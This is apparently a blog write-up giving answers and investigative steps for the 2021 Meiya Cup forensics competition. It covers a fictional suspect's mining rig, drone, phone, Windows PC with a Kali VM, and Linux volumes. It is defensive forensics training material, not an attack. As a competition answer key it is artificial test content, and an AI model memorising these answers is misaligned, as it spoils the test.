id="68常威MAC中以下哪个档案并不是iPhone所拍摄的图片"><a href="#68常威MAC中以下哪个档案并不是iPhone所拍摄的图片" class="headerlink" title="68常威MAC中以下哪个档案并不是iPhone所拍摄的图片"></a>68常威MAC中以下哪个档案并不是iPhone所拍摄的图片</h2><blockquote><p>【多选题】常威MAC计算机中以下哪个档案并不是 Phone所拍摄的图片？（2分）</p><p>A. IMG_0002</p><p>B. IMG_0003</p><p>C. IMG_0004</p><p>D. IMG_0005</p><p>E. IMG_0006</p></blockquote><img src="/images/meiya-2021-03/34.png" alt="image-34" style="zoom:67%;" /><p>照片的Exif信息中可以看到相机型号</p><p>另外也注意到,这些照片从Alex的Iphone中也出现过,不知道Alex和常威是什么关系…</p><img src="/images/meiya-2021-03/35.png" alt="image-35" style="zoom:67%;" /><br><hr><br><h1 id="PART7常威矿机"><a href="#PART7常威矿机" class="headerlink" title="PART7常威矿机"></a>PART7常威矿机</h1><p>在网上搜了一下主流的挖矿软件:</p><img src="/images/meiya-2021-03/36.png" alt="image-36" style="zoom:67%;" /><p>那么对矿机进行分析主要需要关注挖矿软件的日志等</p><p>取证大师加载镜像之后,先在安装软件中过滤一下上述主流的挖矿软件,发现这台矿机安装了<code>Phoenix Miner</code></p><img src="/images/meiya-2021-03/37.png" alt="image-37" style="zoom:67%;" /><p>直接搜索软件名,就能够容易定位到该软件的日志文件:</p><img src="/images/meiya-2021-03/38.png" alt="image-38" style="zoom:67%;" /><p><strong>另外要注意虚拟货币交易中还有一个很重要的wallet钱包文件</strong></p><br><h2 id="69常威的矿机没有进行哪种加密货币掘矿"><a href="#69常威的矿机没有进行哪种加密货币掘矿" class="headerlink" title="69常威的矿机没有进行哪种加密货币掘矿"></a>69常威的矿机没有进行哪种加密货币掘矿</h2><blockquote><p>【多选题】在常威的矿机没有进行哪种加密货币掘矿？（2分）</p><p>A. Bitcoin</p><p>B. Ethereum</p><p>C. RVN</p><p>D. Dodge</p><p>E.ENJ</p></blockquote><p>导出挖矿软件的日志并查看: 清一色的<code>eth(以太坊)</code>没有发现其他类型的虚拟货币</p><img src="/images/meiya-2021-03/39.png" alt="image-39" style="zoom:67%;" /><br><h2 id="70在常威矿机有几张显示适配器进行掘矿"><a href="#70在常威矿机有几张显示适配器进行掘矿" class="headerlink" title="70在常威矿机有几张显示适配器进行掘矿"></a>70在常威矿机有几张显示适配器进行掘矿</h2><p>同样是在日志里找,共调用了GPU1和GPU2两张显卡</p><br><h2 id="71在常威矿机，-hiveOS操作系统是什么版本"><a href="#71在常威矿机，-hiveOS操作系统是什么版本" class="headerlink" title="71在常威矿机， hiveOS操作系统是什么版本"></a>71在常威矿机， hiveOS操作系统是什么版本</h2><p>仿真起来之后直接<code>uname -r</code>查看:</p><img src="/images/meiya-2021-03/40.png" alt="image-40" style="zoom:67%;" /><br><h2 id="72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址"><a href="#72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址" class="headerlink" title="72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址"></a>72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址</h2><blockquote><p>【多选题】在常威矿机中，哪个不是收取掘矿收益的加密货币钱包地址？（1分）</p><p>A.0xE365625f4##537151304ceba7C7D9dF0C7E829##</p><p><strong>B.Oxe68de863f4c3c3cc0##191b9cefdae91b3e6fbd8##</strong></p><p><strong>C.0x00000000897##4136b4a59731680a881895303##</strong></p><p><strong>D.0x7335c##2019533d9cc825e2a6e80821fd44e2718##</strong></p><p><strong>E.0x00##00008970514136b4a59731680a88895303##</strong></p></blockquote><p>在日志中搜索上述地址发现每一个都能搜到,那么就转换思路,找一下钱包wallet文件(直接全局搜索wallet)</p><img src="/images/meiya-2021-03/41.png" alt="image-41" style="zoom:67%;" /><br><h2 id="73常威矿机用于挖矿的登录密码"><a href="#73常威矿机用于挖矿的登录密码" class="headerlink" title="73常威矿机用于挖矿的登录密码"></a>73常威矿机用于挖矿的登录密码</h2><blockquote><p>【单选题】在常威矿机中，用于掘矿登入密码是什么？（2分）</p><p>A. eg97em##wm</p><p>B. Deg97em##wm</p><p>C. fea97em##wm</p><p>D. eeg97em##wm</p><p>E. heg97em##wm</p></blockquote><p>上述选项有共同的关键词,搜索一下就能够找到了</p><img src="/images/meiya-2021-03/42.png" alt="image-42" style="zoom:67%;" /><br><h2 id="74常威矿机中用于挖矿的Nvidia显卡驱动程序版本"><a href="#74常威矿机中用于挖矿的Nvidia显卡驱动程序版本" class="headerlink" title="74常威矿机中用于挖矿的Nvidia显卡驱动程序版本"></a>74常威矿机中用于挖矿的Nvidia显卡驱动程序版本</h2><p>挖矿软件的日志里能够找到:</p><img src="/images/meiya-2021-03/43.png" alt="image-43" style="zoom:67%;" /><br><h2 id="75用于挖矿的显卡型号"><a href="#75用于挖矿的显卡型号" class="headerlink" title="75用于挖矿的显卡型号"></a>75用于挖矿的显卡型号</h2><blockquote><p>【多选题】在常威矿机中，用于掘矿显示适配器型号包括什么？（2分）</p><p><strong>A. GeForce RTX 3060</strong></p><p><strong>B. Quadro P2000</strong></p><p>C. RX 6600</p><p>D. Ge Force GTX 1660 Ti</p><p>E. Ge Force GTX 3070</p></blockquote><p>日志里找到</p><img src="/images/meiya-2021-03/44.png" alt="image-44" style="zoom:67%;" /><h2 id="76常威的矿机哪天没有挖矿"><a href="#76常威的矿机哪天没有挖矿" class="headerlink" title="76常威的矿机哪天没有挖矿"></a>76常威的矿机哪天没有挖矿</h2><blockquote><p>【多选题】在常威矿机，哪天没有进行掘矿？（2分）</p><p>A.2021-10-06</p><p><strong>B.2021-10-09</strong></p><p><strong>C.2021-10-15</strong></p><p><strong>D.2021-10-17</strong></p><p><strong>E.2021-10-18</strong></p></blockquote><p>日志里所有记录都是10月6号的:</p><img src="/images/meiya-2021-03/45.png" alt="image-45" style="zoom:67%;" /><br><hr><br><h1 id="PART8常威无人机-手机"><a href="#PART8常威无人机-手机" class="headerlink" title="PART8常威无人机+手机"></a>PART8常威无人机+手机</h1><h2 id="77常威无人机中的哪个飞航记录DAT文件能够找到2021-10-11-1505时的GPS地点"><a href="#77常威无人机中的哪个飞航记录DAT文件能够找到2021-10-11-1505时的GPS地点" class="headerlink" title="77常威无人机中的哪个飞航记录DAT文件能够找到2021.10.11.1505时的GPS地点"></a>77常威无人机中的哪个飞航记录DAT文件能够找到2021.10.11.1505时的GPS地点</h2><blockquote><p>【填空题】常威的无人机中的飞航纪录  DAT可见到于2021年10月11日1505时的GPS地点。（请以英文全大写及阿拉伯数字回答）（1分）</p></blockquote><p>这里给的无人机镜像是和手机类似的镜像文件,可以使用<code>Cellebrite Reader</code>打开</p><p>打开之后发现一个存储飞行记录<code>dat</code>文件的目录,将此目录导出</p><img src="/images/meiya-2021-03/46.png" alt="image-46" style="zoom:67%;" /><p>文件太多,不方便挨个看,所以先定位具体时间段,由此找到对应的源文件:也就是<code>FLY096.DAT</code></p><img src="/images/meiya-2021-03/47.png" alt="image-47" style="zoom:67%;" /><br><h2 id="78无人机于2021-10-11-15-07-51时所在的地点"><a href="#78无人机于2021-10-11-15-07-51时所在的地点" class="headerlink" title="78无人机于2021.10.11.15:07:51时所在的地点"></a>78无人机于2021.10.11.15:07:51时所在的地点</h2><blockquote><p>常威的无人机于2021年10月11日15:07:51时之间所在的地点是什么？（1分）</p><p>A.22.269299.114.200486</p><p>B.22.269353,114.287267</p><p>C.22.346855.114.289552</p><p><strong>D.22.269293,114.201278</strong></p></blockquote><p>使用物联网取证分析软件解析上一题找到的<code>FLY096.DAT</code></p><img src="/images/meiya-2021-03/48.png" alt="image-48" style="zoom:67%;" /><p>选择一个最接近的选项</p><br><h2 id="79常威的无人机哪一个档案有最后降落时间"><a href="#79常威的无人机哪一个档案有最后降落时间" class="headerlink" title="79常威的无人机哪一个档案有最后降落时间"></a>79常威的无人机哪一个档案有最后降落时间</h2><p>找到最后出现的时间点,看对应的源文件,还是<code>FLY096.DAT</code></p><img src="/images/meiya-2021-03/49.png" alt="image-49" style="zoom:67%;" /><br><h2 id="80常威的手机中哪个是由无人机于2021-10-11拍摄的图像"><a href="#80常威的手机中哪个是由无人机于2021-10-11拍摄的图像" class="headerlink" title="80常威的手机中哪个是由无人机于2021.10.11拍摄的图像"></a>80常威的手机中哪个是由无人机于2021.10.11拍摄的图像</h2><blockquote><p>【多选题】常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件？（2分）</p><p><strong>A. Containers货柜</strong></p><p><strong>B. Buildings大厦</strong></p><p>C. bicycle单车</p><p><strong>D. Mountain山</strong></p></blockquote><p>已知无人机的品牌是大疆(DJI),所以在手机的图片库里先以此为关键词过滤,找到疑似是无人机拍摄的图片:</p><img src="/images/meiya-2021-03/50.png" alt="image-50" style="zoom:67%;" /><p>到其路径下,找到10月11日无人机拍摄的所有照片</p><img src="/images/meiya-2021-03/51.png" alt="image-51" style="zoom:67%;" /><p>其中包含大厦,货柜和山,没有发现单车</p><br><h2 id="81常威的手机中显示的无人机DJGO4的版本"><a href="#81常威的手机中显示的无人机DJGO4的版本" class="headerlink" title="81常威的手机中显示的无人机DJGO4的版本"></a>81常威的手机中显示的无人机DJGO4的版本</h2><p>在安装程序列表里找到大疆的手机APP:</p><img src="/images/meiya-2021-03/52.png" alt="image-52" style="zoom:67%;" /><br><h2 id="82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区"><a href="#82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区" class="headerlink" title="82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区"></a>82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区</h2><blockquote><p>【多选题】常威的手机中所安装的DJIGO4软件中，以下哪个 database没有显示临时禁飞区？（2分）</p><p><strong>A. Filesflysate app db</strong></p><p><strong>B. Special warning.db</strong></p><p>C. Flysate app dynamic areas. db</p><p><strong>D. Flysafe polygon 1860. db</strong></p></blockquote><p>在数据库列表中过滤并查看这几个数据库文件:</p><img src="/images/meiya-2021-03/53.png" alt="image-53" style="zoom:67%;" /><p>只在C选项的数据库文件中发现了临时禁飞区</p><br><h2 id="83在哪个数据库文件可以知道DJGO4的登入电子邮件"><a href="#83在哪个数据库文件可以知道DJGO4的登入电子邮件" class="headerlink" title="83在哪个数据库文件可以知道DJGO4的登入电子邮件"></a>83在哪个数据库文件可以知道DJGO4的登入电子邮件</h2><p><strong>安卓中, <code>com.android.vending</code>是<code>google play</code>商店的应用包</strong></p><p><strong>其中的数据库包含了其他应用的一定信息</strong></p><p><strong>例如<code>localappstate</code>这个数据库记录了本地app的一些状态信息(例如APP的登录账户)</strong></p><img src="/images/meiya-2021-03/54.png" alt="image-54" style="zoom:67%;" /><img src="/images/meiya-2021-03/55.png" alt="image-55" style="zoom:67%;" /><br><h2 id="84哪个数据库文件包含了名为server-timestamp的资料"><a href="#84哪个数据库文件包含了名为server-timestamp的资料" class="headerlink" title="84哪个数据库文件包含了名为server_timestamp的资料"></a>84哪个数据库文件包含了名为server_timestamp的资料</h2><p>这个在大疆APP的数据库里就能找到:</p><img src="/images/meiya-2021-03/56.png" alt="image-56" style="zoom:67%;" /><br><hr><br><h1 id="PART9常威Windows"><a href="#PART9常威Windows" class="headerlink" title="PART9常威Windows"></a>PART9常威Windows</h1><p>看一遍题目,这部分肯定是得仿真起来了</p><img src="/images/meiya-2021-03/57.png" alt="image-57" style="zoom:67%;" /><p>虚拟机跑起来后,准备安装<code>VMware tools</code>时,偶然发现了两个可疑的文件<code>pw.txt</code>和<code>test2.txt</code></p><h2 id="85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址"><a href="#85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址" class="headerlink" title="85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址"></a>85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址</h2><blockquote><p>【单选题】常威利用 Windows计算机中的VMKali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址（2分）</p><p><strong>A.Users\Chris Paul\Desktop\安全防护\MalwarekKali-Linux2020.2a-amd64_2.vmwarevm</strong></p><p>B USers\Chris paul\Desktop\安全防护\Malware demo\kali-Linux2020.2a-amd64_2.vmwarevm</p><p>C USers\Chris paul\documenys\安全防护Malware\Kali-Lnux2020.2a-amd64_2.vmwarevm</p><p>D Users\Chris Paul\Documents\Virtual machines</p></blockquote><p>仿真起来之后,桌面上有两个文件夹都放了虚拟机</p><img src="/images/meiya-2021-03/58.png" alt="image-58" style="zoom:67%;" /><p>直接打开VMware就能看到哪个是常用的了</p><img src="/images/meiya-2021-03/59.png" alt="image-59" style="zoom:67%;" /><br><h2 id="86哪个档案可以证明常威将存储数据的text2-txt移动到了kali虚拟机中"><a href="#86哪个档案可以证明常威将存储数据的text2-txt移动到了kali虚拟机中" class="headerlink" title="86哪个档案可以证明常威将存储数据的text2.txt移动到了kali虚拟机中"></a>86哪个档案可以证明常威将存储数据的text2.txt移动到了kali虚拟机中</h2><blockquote><p>【单选题】常威在收集数据后储存数据于 Windows计算机一个名为”text2.txt”的档案中，随后他将档案移往” \home\kali\ Desktop\project&quot;中，下述哪个档案可以证明这一点？i)\root. bash_history ii)\home\kali.bash_history（3分）</p><p>A.只有i</p><p>B.只有ii</p><p>C.两个也可以</p><p><strong>D.两个也不可以</strong></p></blockquote><p>在取证大师里把虚拟机文件夹导出来,然后在作为镜像添加(或者直接在vmdk文件上右键-虚拟磁盘分析)</p><p>自动取证之后在历史命令里过滤<code>test2.txt</code>这个文件:</p><img src="/images/meiya-2021-03/60.png" alt="image-60" style="zoom:67%;" /><img src="/images/meiya-2021-03/61.png" alt="image-61" style="zoom:67%;" /><p>root用户的历史命令里,能找到一个<code>mv</code>命令,但是这也只是<strong>在虚拟机内移动了这个文件</strong></p><p>不能说明将文件从主机传到了虚拟机</p><p>事实上:<strong>把文件直接从Windows里面拖进虚拟机不会留下历史命令,所以其实两者都无法证明</strong></p><br><h2 id="87常威计算机中哪一个程式-x2F-档案有可能用作收取受害人电话上的数据"><a href="#87常威计算机中哪一个程式-x2F-档案有可能用作收取受害人电话上的数据" class="headerlink" title="87常威计算机中哪一个程式&#x2F;档案有可能用作收取受害人电话上的数据"></a>87常威计算机中哪一个程式&#x2F;档案有可能用作收取受害人电话上的数据</h2><blockquote><p>【单选题】常威 Windows计算机中哪一个程式&#x2F;档案有可能用作收取受害人电话上的数据？（3分）（这题取证大师分析之后可直接排除AD，因为实在baddish文件夹下的，然后看解析出来的终端命令，就选择C了）</p><p>A. \home\kali\Desktop\server_express_ok.js</p><p>B.\home\kali\Desktop\ baddish\package.json</p><p><strong>C \home\kali\Desktop\baddish\server.js</strong></p><p>D.\home\kali\Desktop\server.js</p></blockquote><p>在上一题浏览历史命令时,已经注意到有一个名为<code>server.js</code>的脚本</p><img src="/images/meiya-2021-03/62.png" alt="image-62" style="zoom:67%;" /><p>这里使用<code>node</code>命令运行了<code>server.js</code>脚本,并将结果输入到了<code>text2.txt</code>中</p><img src="/images/meiya-2021-03/63.png" alt="image-63" style="zoom:67%;" /><p>顺着选项里的路径找到<code>server.js</code>的位置</p><img src="/images/meiya-2021-03/64.png" alt="image-64" style="zoom:67%;" /><p>最后查看一下<code>text2.txt</code>的内容,就可以确定了:</p><img src="/images/meiya-2021-03/65.png" alt="image-65" style="zoom:67%;" /><br><h2 id="88常威第一次是在哪一个日子及时间登入Kali系统"><a href="#88常威第一次是在哪一个日子及时间登入Kali系统" class="headerlink" title="88常威第一次是在哪一个日子及时间登入Kali系统"></a>88常威第一次是在哪一个日子及时间登入Kali系统</h2><blockquote><p>【多选题】常威 Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入Kali系统？（2分）</p><p><strong>A.2021-09-27</strong></p><p>B.2021-09-29</p><p>C.2021-09-29</p><p>D.11:42:47</p><p>E.16:04:24</p><p><strong>F.16:30:04</strong></p></blockquote><p>直接找kali的登录日志,找到最早的登录时间</p><img src="/images/meiya-2021-03/66.png" alt="image-66" style="zoom:67%;" /><br><h2 id="89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案"><a href="#89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案" class="headerlink" title="89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案"></a>89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案</h2><blockquote><p>89【多选题】常威 Windows计算机中以下哪—个檔案的哈希值（MD5）能证明常威曾开启存有客户数据的档案？（2分）</p><p>A OED1DB00F8598AD3C6B331BF0C477AD4</p><p>B.1E1BDB083F66251A63B79DEA3801E6E9</p><p><strong>C.575326396E31040FE2E13BE42c553E2</strong></p><p>D.3128604B4A9Ec1D37418942555F6B08A </p><p>E. FB5EF33EDEA8ECB5BF07C5DF5332D29F</p></blockquote><p>从最近访问文件中跳转源文件,最近打开的文档,在<code>recent</code>文件中会留下<code>ink</code>的快捷方式.计算哈希比对即可</p><img src="/images/meiya-2021-03/67.png" alt="image-67" style="zoom:67%;" /><br><h2 id="90哪个档案可以找到USB装置初次连接的时间"><a href="#90哪个档案可以找到USB装置初次连接的时间" class="headerlink" title="90哪个档案可以找到USB装置初次连接的时间"></a>90哪个档案可以找到USB装置初次连接的时间</h2><blockquote><p>【单选题】常威 Windows计算机中，哪个档案可以找到USB装置初次连接的时间？（1分）</p><p>A. C:\Windows\setupapi.log</p><p>B. C:\Windows\setupapi.setup.log</p><p><strong>C. C:\WIndows\INF\setupapi.setup.log</strong></p><p>D. C:WIndows\INF\setupapi.Dev.log</p></blockquote><p>直接以四个选项都有的<code>setupapi</code>作为关键词实时搜索,然后结果中再过滤出<code>log</code>格式的文件</p><img src="/images/meiya-2021-03/68.png" alt="image-68" style="zoom:67%;" /><p>两个文件都导出来,内容差不多…但是C选项的这个时间更早…</p><img src="/images/meiya-2021-03/69.png" alt="image-69" style="zoom:67%;" /><img src="/images/meiya-2021-03/70.png" alt="image-70" style="zoom:67%;" /><br><h2 id="91此计算机连接过一个3D打印机-哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件-INF格式"><a href="#91此计算机连接过一个3D打印机-哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件-INF格式" class="headerlink" title="91此计算机连接过一个3D打印机,哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件(INF格式)"></a>91此计算机连接过一个3D打印机,哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件(INF格式)</h2><blockquote><p>【单选题】常威 Windows计算机接驳了一个3D打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件（INF檔）？（提示：关键词包含CH341）（3分）</p><p>A.1348FA38956##1770D7C3E63545BC</p><p>B.DBC4F08F835###FF95420B352B506A</p><p><strong>C.35E7c67A652###611EDE19C37241c5</strong></p><p>D. BAE3BE76CC1####31EB562ABAFE28DE</p></blockquote><p>既然提示了,就直接实时搜索<code>ch341</code>,然后结果里过滤出<code>inf</code>格式的文件</p><img src="/images/meiya-2021-03/71.png" alt="image-71" style="zoom:67%;" /><br><h2 id="92接上题-上述安装信息文件的版本日期是什么"><a href="#92接上题-上述安装信息文件的版本日期是什么" class="headerlink" title="92接上题,上述安装信息文件的版本日期是什么"></a>92接上题,上述安装信息文件的版本日期是什么</h2><p>导出上一题的文件查看即可</p><img src="/images/meiya-2021-03/72.png" alt="image-72" style="zoom:67%;" /><br><h2 id="93此计算机安装了一些与3D-打印机有关的软件-有可能是以下哪个"><a href="#93此计算机安装了一些与3D-打印机有关的软件-有可能是以下哪个" class="headerlink" title="93此计算机安装了一些与3D 打印机有关的软件,有可能是以下哪个"></a>93此计算机安装了一些与3D 打印机有关的软件,有可能是以下哪个</h2><blockquote><p>93.常威Windows计算机安装了一些与3D 打印机有关的软件，有可能是以下哪个?</p><p><strong>A Ultimaker cura</strong></p><p>B 3DPrinterOS</p><p>C Simplify 3D</p><p><strong>D Creality Slicer</strong></p></blockquote><p>直接在安装的软件中过滤,只能找到AD:</p><img src="/images/meiya-2021-03/73.png" alt="image-73" style="zoom:67%;" /><br><h2 id="94续上题-哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块-stl-纪录"><a href="#94续上题-哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块-stl-纪录" class="headerlink" title="94续上题,哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块(.stl)纪录"></a>94续上题,哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块(.stl)纪录</h2><blockquote><p>【单选题】续上题，哪一个档案记录了切片软件 Creality Slicer曾经开启的3d立体模块（.stl）纪录？（1分）</p><p>A.\Users\Chris Paul\AppData\Roaming\CrealitySlicer\stderr.log</p><p>B.\Users\Chris Paul\AppData\Roaming\Creality Slicer\stdout. log</p><p>C.\Users\ Chris Paul\AppData \Roaming \CrealitySlicer\4.8\Creality Slicer .cfg</p><p><strong>D.\Users\Chris Paul\AppData\Roaming\Reality Slicer\4.8</strong></p></blockquote><p>顺着选项的路径在虚拟机里找就行,答案是D</p><img src="/images/meiya-2021-03/74.png" alt="image-74" style="zoom:67%;" /><br><h2 id="95续上题-哪个3d立体模块-stl-曾用切片软件Creality-Slicer开启"><a href="#95续上题-哪个3d立体模块-stl-曾用切片软件Creality-Slicer开启" class="headerlink" title="95续上题,哪个3d立体模块(.stl)曾用切片软件Creality Slicer开启"></a>95续上题,哪个3d立体模块(.stl)曾用切片软件Creality Slicer开启</h2><blockquote><p>【多选题】续上题，哪个3d立体模块（.stl）曾用切片软件 Creality Slicer开启？（2分）</p><p><strong>A Clip_sideb.stl</strong></p><p><strong>B frame.stl</strong></p><p>C trigger.stl</p><p>D Hand_guard.stl</p></blockquote><p>直接在上一题找到的日志文件中搜索:</p><img src="/images/meiya-2021-03/75.png" alt="image-75" style="zoom:67%;" /><br><hr><br><h1 id="PART10常威Linux"><a href="#PART10常威Linux" class="headerlink" title="PART10常威Linux"></a>PART10常威Linux</h1><p>(比赛时都没做到这里,先把网上的wp放一部分在这里,回头再补做一下)</p><h2 id="96此镜像LinuxLVM磁盘分区的长度"><a href="#96此镜像LinuxLVM磁盘分区的长度" class="headerlink" title="96此镜像LinuxLVM磁盘分区的长度"></a>96此镜像LinuxLVM磁盘分区的长度</h2><p>加载镜像后,发现分区2是逻辑分区(<strong>LVM:Logical Volume Manager</strong>),swap\root\home 是逻辑分区下的三个子分区</p><img src="/images/meiya-2021-03/76.png" alt="image-76" style="zoom:67%;" /><p>可以直接使用取证大师小程序「证据文件硬盘信息」来查看LVM分区长度</p><img src="/images/meiya-2021-03/77.png" alt="image-77" style="zoom:67%;" /><br><h2 id="97LVM分区的卷组-VolumeGroup-的通用唯一标识符"><a href="#97LVM分区的卷组-VolumeGroup-的通用唯一标识符" class="headerlink" title="97LVM分区的卷组(VolumeGroup)的通用唯一标识符"></a>97LVM分区的卷组(VolumeGroup)的通用唯一标识符</h2><img src="/images/meiya-2021-03/78.png" alt="image-78" style="zoom:67%;" /><br><h2 id="98续上题-哪一个是逻辑卷-LogicalVolume-设定的名字"><a href="#98续上题-哪一个是逻辑卷-LogicalVolume-设定的名字" class="headerlink" title="98续上题,哪一个是逻辑卷(LogicalVolume)设定的名字"></a>98续上题,哪一个是逻辑卷(LogicalVolume)设定的名字</h2><blockquote><p>【多选题】续上题，哪一个是逻辑卷（ Logical Volume）设定的名字？（2分）</p><p><strong>A. swap</strong></p><p><strong>B. root</strong></p><p>C. va</p><p><strong>D. home</strong></p></blockquote><p>逻辑卷包括这三个</p><img src="/images/meiya-2021-03/79.png" alt="image-79" style="zoom:67%;" /><br><h2 id="99此Linux计算机曾用挖矿程式”T-Rex”-在相关脚本-script-中哪个是工人-worker-的名称"><a href="#99此Linux计算机曾用挖矿程式”T-Rex”-在相关脚本-script-中哪个是工人-worker-的名称" class="headerlink" title="99此Linux计算机曾用挖矿程式”T-Rex”,在相关脚本(script)中哪个是工人(worker)的名称"></a>99此Linux计算机曾用挖矿程式”T-Rex”,在相关脚本(script)中哪个是工人(worker)的名称</h2><blockquote><p>【单选题】常威Linux计算机曾试用挖矿程式”T-Rex”，在相关脚本 (script)中哪个是工人(worker)的名称？（1分）</p><p>A. stratum</p><p><strong>B. rigo</strong></p><p>C. ethash</p><p>D.E3656251402537151304ceba7c7D9dFoc7E82986100.</p></blockquote><p>待补充</p><br><h2 id="100哪个是exFAT的磁盘分区类型编号"><a href="#100哪个是exFAT的磁盘分区类型编号" class="headerlink" title="100哪个是exFAT的磁盘分区类型编号"></a>100哪个是exFAT的磁盘分区类型编号</h2><blockquote><p>【填空题】LINUX系统中利用fdisk指令下，下列哪一个是”exFAT”的磁盘分区类型编号（ Partition type id）？（请以英文全大写及阿拉伯数字回答）（1分）</p></blockquote><p>待补充</p><br><h2 id="101哪个指令用于激活扫描到的卷组-VolumeGroup"><a href="#101哪个指令用于激活扫描到的卷组-VolumeGroup" class="headerlink" title="101哪个指令用于激活扫描到的卷组(VolumeGroup)"></a>101哪个指令用于激活扫描到的卷组(VolumeGroup)</h2><blockquote><p>【单选题】在Linux的环境下，以下哪一个指令用于激活扫描到的卷组（Volume group）（1分）</p><p>A. vgscan</p><p><strong>B. vgchange</strong></p><p>C. display</p><p>D. vgactive</p></blockquote><ul><li><p><code>vgscan</code>指令查找系统中存在的LVM卷组，并显示找到的卷组列表。</p></li><li><p><code>vgchange</code>指令用于修改卷组的属性，<strong>经常被用来设置卷组是处于活动状态或者非活动状态</strong>。</p></li><li><p><code>display\vgactive</code>没有搜索到和卷组相关的命令</p></li></ul><br><h2 id="102哪一个指令用于删除内有档案的文件夹"><a href="#102哪一个指令用于删除内有档案的文件夹" class="headerlink" title="102哪一个指令用于删除内有档案的文件夹"></a>102哪一个指令用于删除内有档案的文件夹</h2><blockquote><p>【单选题】在 Linux的环境下，下列哪—个指令可以删除内有档案的文件夹？（1分）</p><p>A. rm-d</p><p>B. rm-r</p><p>C. rm -rd</p><p><strong>D. rm-rf</strong></p></blockquote><p>常识题</p><br><h2 id="103常威Linux的Logical-Volume路径-“vg-x2F-home”使用了甚么系统建立"><a href="#103常威Linux的Logical-Volume路径-“vg-x2F-home”使用了甚么系统建立" class="headerlink" title="103常威Linux的Logical Volume路径 “vg&#x2F;home”使用了甚么系统建立"></a>103常威Linux的Logical Volume路径 “vg&#x2F;home”使用了甚么系统建立</h2><p>使用lvdiskplay命令来查看</p><p>待补充</p><br><h2 id="104常威Linux的Logical-Volume路径-“vg-x2F-home”的CurrentLE是什么"><a href="#104常威Linux的Logical-Volume路径-“vg-x2F-home”的CurrentLE是什么" class="headerlink" title="104常威Linux的Logical Volume路径 “vg&#x2F;home”的CurrentLE是什么"></a>104常威Linux的Logical Volume路径 “vg&#x2F;home”的CurrentLE是什么</h2><p>使用lvdiskplay命令来查看</p><p>待补充</p><br><h2 id="105常威Linux的Volume-group的TotalPE是什么"><a href="#105常威Linux的Volume-group的TotalPE是什么" class="headerlink" title="105常威Linux的Volume group的TotalPE是什么"></a>105常威Linux的Volume group的TotalPE是什么</h2><p>使用lvdiskplay命令来查看</p><p>待补充</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_团队赛上</title>
      <link href="/post/71007601.html"/>
      <url>/post/71007601.html</url>
      
        <content type="html"><![CDATA[<h1 id="PART1工地员工staffA-staffB的计算机"><a href="#PART1工地员工staffA-staffB的计算机" class="headerlink" title="PART1工地员工staffA,staffB的计算机"></a>PART1工地员工staffA,staffB的计算机</h1><p>根据整体案情,这两台电脑应该是<a href="51090d68.html">个人赛(见第7题)</a>中,和工地主管的电脑一起被BitLocker锁住的另外两个员工的电脑</p><p>在分析<a href="51090d68.html">个人赛(Alex的FTP服务器)</a>时,曾找到过两个BitLocker密钥文件,可以用来解锁这俩电脑的磁盘</p><p><img src="/images/meiya-2021-02/image-20220810185940477.png" alt="image-20220810185940477"></p><h2 id="1工地职员-A-计算机的修复密钥标识符"><a href="#1工地职员-A-计算机的修复密钥标识符" class="headerlink" title="1工地职员 A 计算机的修复密钥标识符"></a>1工地职员 A 计算机的修复密钥标识符</h2><p>使用取证大师加载staffA镜像后,右键被加密的磁盘-<code>BitLocker解密</code>就能看见</p><img src="/images/meiya-2021-02/image-20220810190128802.png" alt="image-20220810190128802" style="zoom:67%;" /><br><h2 id="2工地职员-A-计算机的修复密钥"><a href="#2工地职员-A-计算机的修复密钥" class="headerlink" title="2工地职员 A 计算机的修复密钥"></a>2工地职员 A 计算机的修复密钥</h2><p>就是从Alex的FTP服务器里找到的那个</p><br><h2 id="3工地职员-A的计算机被什么程式加密"><a href="#3工地职员-A的计算机被什么程式加密" class="headerlink" title="3工地职员 A的计算机被什么程式加密"></a>3工地职员 A的计算机被什么程式加密</h2><blockquote><p>【单选题】工地职员 A的计算机被什么程式密?(1分)</p><p>A.Ransomware</p><p><strong>B.BitLocker</strong></p><p>C.AxCrypt</p><p>D.PGP</p><p>E.FileVault 2</p></blockquote><p>这个很显然是BitLocker了</p><br><h2 id="4工地职员A的孩子有可能正准备就读什么学校"><a href="#4工地职员A的孩子有可能正准备就读什么学校" class="headerlink" 